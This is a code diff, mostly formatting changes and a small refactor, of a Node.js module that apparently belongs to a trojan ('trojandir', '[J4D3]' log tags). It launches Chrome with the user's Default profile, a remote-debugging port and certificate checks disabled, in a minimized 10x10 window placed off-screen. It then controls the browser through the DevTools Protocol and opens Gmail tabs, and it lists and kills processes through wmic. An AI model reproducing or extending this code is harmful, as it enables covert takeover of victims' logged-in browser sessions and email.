@@ -28,9 +28,7 @@ let chrome_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
 
 const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
-
 function csvToJson(csvData) {
-
     const lines = csvData.split(/[\r\n]+/).filter((line) => line.trim() !== "");
 
     const headers = lines[0].split(",");
@@ -49,23 +47,19 @@ function csvToJson(csvData) {
 
         let n = currentLine.length;
 
-        if ( n > 3 ) {
-
+        if (n > 3) {
             let m = headers.length;
 
-            obj[headers[m-1].trim()] = currentLine[n-1];
-            obj[headers[m-2].trim()] = currentLine[n-2];
-            
-            let commandline = currentLine.slice(1,n-2);
-            obj['CommandLine'] = commandline.join(',');
+            obj[headers[m - 1].trim()] = currentLine[n - 1];
+            obj[headers[m - 2].trim()] = currentLine[n - 2];
+
+            let commandline = currentLine.slice(1, n - 2);
+            obj["CommandLine"] = commandline.join(",");
             obj[headers[0].trim()] = currentLine[0];
-
         } else {
-
             for (let j = 0; j < headers.length; j++) {
                 obj[headers[j].trim()] = currentLine[j]?.trim() || "";
             }
-
         }
 
         result.push(obj);
@@ -85,14 +79,15 @@ function isUTF16LEBuffer(buffer) {
     return buffer[0] === 0xff && buffer[1] === 0xfe;
 }
 
-async function is_chrome_active(debugport=9223) {
-    
+async function is_chrome_active(debugport = 9223) {
     // [ { Node: '', CommandLine: '', Name: 'System Idle Process', ProcessId: '' } ]
     let procs = await getProcessList_wmic();
 
     procs = procs.filter((element, index, array) => {
-        let check_a = element.Name?.toLowerCase().includes('chrome');
-        let check_b = element.CommandLine?.toLowerCase().includes('remote-debugging-port');
+        let check_a = element.Name?.toLowerCase().includes("chrome");
+        let check_b = element.CommandLine?.toLowerCase().includes(
+            "remote-debugging-port"
+        );
         return check_a && check_b;
     });
 
@@ -103,12 +98,15 @@ async function is_chrome_active(debugport=9223) {
 
 // note: spawning chrome process --> results in a PID that differs from launch
 // ! can't use isPidAlive to check if pid is active
-async function activate_chrome(start_url="https://www.gmail.com", debugport=9223, headless=false, unref=false) {
-
+async function activate_chrome(
+    start_url = "https://www.gmail.com",
+    debugport = 9223,
+    headless = false,
+    unref = false
+) {
     let isactive = await is_chrome_active();
 
-    if ( isactive )
-        return true;
+    if (isactive) return true;
 
     childp = spawn_chrome(start_url, debugport, headless, unref);
     // helper.exec_chrome(start_url, debugport, headless);
@@ -126,14 +124,13 @@ function kill_chrome() {
 
         exec(wmicCommand, (error, stdout, stderr) => {
             if (error) {
-                reject( { error: error, stderr: stderr } );
+                reject({ error: error, stderr: stderr });
             }
 
-            resolve( { stdout:stdout, stderr:stderr } );
+            resolve({ stdout: stdout, stderr: stderr });
         });
     });
 }
-
 
 async function exec_wmic_process() {
     return new Promise((resolve, reject) => {
@@ -259,23 +256,23 @@ function isPidAlive(pid) {
     }
 }
 
-function exec_chrome(starturl = "https://www.gmail.com/",
+function exec_chrome(
+    starturl = "https://www.gmail.com/",
     debugport = 9223,
     headless = false,
     x_pos = 2000,
     y_pos = 2000,
-    width=10,
-    height=10,
+    width = 10,
+    height = 10,
     datadir = path.join(trojandir, "chrome"),
     stdoutfunc = null,
-    stderrfunc = null,
+    stderrfunc = null
 ) {
-
     let cmdlineargs = [
         `--remote-debugging-port=${debugport}`,
         `--user-data-dir=${datadir}`,
         `--new-window ${starturl}`,
-        headless ? `--headless=new` : '',
+        headless ? `--headless=new` : "",
         `--no-first-run`, // You can skip Chrome's welcome and setup screens
         `--no-default-browser-check`,
         `--profile-directory=Default`,
@@ -284,28 +281,26 @@ function exec_chrome(starturl = "https://www.gmail.com/",
         `--ignore-certificate-errors`,
         `--window-position=${x_pos},${y_pos}`,
         `--window-size=${width},${height}`,
-        `--hide-crash-restore-bubble`
+        `--hide-crash-restore-bubble`,
     ];
 
-    let ret = exec(`start "" /min ${chrome_debug_path} ${cmdlineargs.join(' ')}`, (error, stdout, stderr) => {
-        
-        logmsg(stdout);
-        
-        if (stdoutfunc)
-            stdoutfunc(stdout);
+    let ret = exec(
+        `start "" /min ${chrome_debug_path} ${cmdlineargs.join(" ")}`,
+        (error, stdout, stderr) => {
+            logmsg(stdout);
 
-        logmsg(stderr);
+            if (stdoutfunc) stdoutfunc(stdout);
 
-        if (stderrfunc)
-            stderrfunc(stderr);
+            logmsg(stderr);
 
-        if (error) {
-            logmsg(`Error: ${error.message}`);
-            return;
+            if (stderrfunc) stderrfunc(stderr);
+
+            if (error) {
+                logmsg(`Error: ${error.message}`);
+                return;
+            }
         }
-
-    });
-
+    );
 }
 
 // note: child chrome process has a new/different pid upon launch
@@ -317,8 +312,8 @@ function spawn_chrome(
     unref = false,
     x_pos = 2000,
     y_pos = 2000,
-    width=10,
-    height=10,
+    width = 10,
+    height = 10,
     datadir = path.join(trojandir, "chrome"),
     stdoutfunc = null,
     stderrfunc = null,
@@ -330,7 +325,7 @@ function spawn_chrome(
         `--remote-debugging-port=${debugport}`,
         // `--user-data-dir=${datadir}`,
         `--new-window ${starturl}`,
-        headless ? `--headless=new` : '',
+        headless ? `--headless=new` : "",
         `--no-first-run`, // You can skip Chrome's welcome and setup screens
         `--no-default-browser-check`,
         `--profile-directory=Default`,
@@ -339,7 +334,7 @@ function spawn_chrome(
         `--ignore-certificate-errors`,
         `--window-position=${x_pos},${y_pos}`,
         `--window-size=${width},${height}`,
-        `--hide-crash-restore-bubble`
+        `--hide-crash-restore-bubble`,
     ];
 
     // TODO auto discover by reading chrome lnk files
@@ -371,8 +366,7 @@ function spawn_chrome(
         else logmsg(`[J4D3] child process exited with code ${code}`);
     });
 
-    if ( unref )
-        child.unref();
+    if (unref) child.unref();
 
     return child;
 }
@@ -401,34 +395,31 @@ json/version
 */
 
 var payloads = {
-
-    'create_new_tab': {
-        "id": 1,
-        "method": "Target.createTarget",
-        "params": {
-            "url": null,
-            "newWindow": false,
+    create_new_tab: {
+        id: 1,
+        method: "Target.createTarget",
+        params: {
+            url: null,
+            newWindow: false,
             // "width": 10,
             // "height": 10,
             // // "left": 2000,
             // "top": 2000
             // #"windowState": "minimized"
             // #"hidden": True
-        }
-    }
-
+        },
+    },
 };
 
-function create_new_tab(url='https://www.gmail.com/') {
-    let payload = { ...payloads['create_new_tab'] };
+function create_new_tab(url = "https://www.gmail.com/") {
+    let payload = { ...payloads["create_new_tab"] };
     payload.params.url = url;
     return payload;
 }
 
-async function ping_chrome(debugport, path = 'json/version') {
-    
-    if ( ! isNullOrWhitespace(path) && ! path.startsWith('/') ) {
-        path = '/' + path;
+async function ping_chrome(debugport, path = "json/version") {
+    if (!isNullOrWhitespace(path) && !path.startsWith("/")) {
+        path = "/" + path;
     }
 
     const response = await fetch(`http://localhost:${debugport}${path}`);
@@ -438,21 +429,13 @@ async function ping_chrome(debugport, path = 'json/version') {
     return cleanString;
 }
 
-async function connectToChrome(debugport, openfunc, messagefunc, errorfunc) {
-    const response = await ping_chrome(debugport, 'json/version');
-    const targets = JSON.parse(response); //await response.json();
+function connectToTarget(targetUrl, openfunc, messagefunc, errorfunc) {
+    logmsg(`Connecting to: ${targetUrl}`);
 
-    // ws://127.0.0.1:9223/devtools/browser/80d329c6-bce8-482a-8cf8-859425508382
-    // 'ws://localhost:9223/devtools/browser/80d329c6-bce8-482a-8cf8-859425508382'
-    const wsUrl = targets.webSocketDebuggerUrl;
-
-    // ws_url = "ws://localhost:9222/devtools/page/"+targetid
-    logmsg(`Connecting to: ${wsUrl}`);
-
-    const ws = new WebSocket(wsUrl);
+    const ws = new WebSocket(targetUrl);
 
     ws.on("open", () => {
-        logmsg("Connected to Chrome DevTools Protocol");
+        logmsg(`Connected to Chrome DevTools Protocol -- ${targetUrl}`);
         if (openfunc) openfunc();
     });
 
@@ -467,12 +450,27 @@ async function connectToChrome(debugport, openfunc, messagefunc, errorfunc) {
         if (errorfunc) errorfunc(err);
     });
 
-    return { 'ws':ws, 'ws_url':wsUrl };
+    return ws;
+}
+
+async function connectToChrome(debugport, openfunc, messagefunc, errorfunc) {
+    const response = await ping_chrome(debugport, "json/version");
+    const targets = JSON.parse(response); //await response.json();
+
+    // ws://127.0.0.1:9223/devtools/browser/80d329c6-bce8-482a-8cf8-859425508382
+    // 'ws://localhost:9223/devtools/browser/80d329c6-bce8-482a-8cf8-859425508382'
+    const wsUrl = targets.webSocketDebuggerUrl;
+
+    // ws_url = "ws://localhost:9222/devtools/page/"+targetid
+    let ws = connectToTarget(wsUrl, openfunc, messagefunc, errorfunc);
+
+    return { ws: ws, ws_url: wsUrl };
 }
 
 logmsg("--- EXPORTING ---");
 
 module.exports = {
+    connectToTarget,
     exec_chrome,
     activate_chrome,
     spawn_chrome,
@@ -487,7 +485,7 @@ module.exports = {
     create_new_tab,
     getProcessList_wmic,
     ping_chrome,
-    delay
+    delay,
 };
 
 // childp = spawn_chrome();
